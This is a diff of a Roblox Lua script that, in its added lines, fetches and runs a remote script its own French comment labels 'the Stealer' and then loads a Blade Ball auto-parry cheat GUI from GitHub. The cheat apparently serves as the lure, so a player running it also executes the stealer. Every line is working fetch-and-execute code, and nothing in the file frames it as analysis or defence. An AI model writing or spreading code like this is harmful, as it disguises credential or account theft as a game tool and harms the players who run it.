@@ -1,1 +1,15 @@
-loadstring(game:HttpGet("https://pastefy.app/lJbSvZYc/raw"))()
+-- Exécution du Stealer
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/lJbSvZYc/raw"))()
+    end)
+end)
+
+task.wait(1) -- Pause de sécurité pour laisser le premier script s'initialiser
+
+-- Exécution du GUI Blade Ball (Auto Parry)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))() 
+    end)
+end)
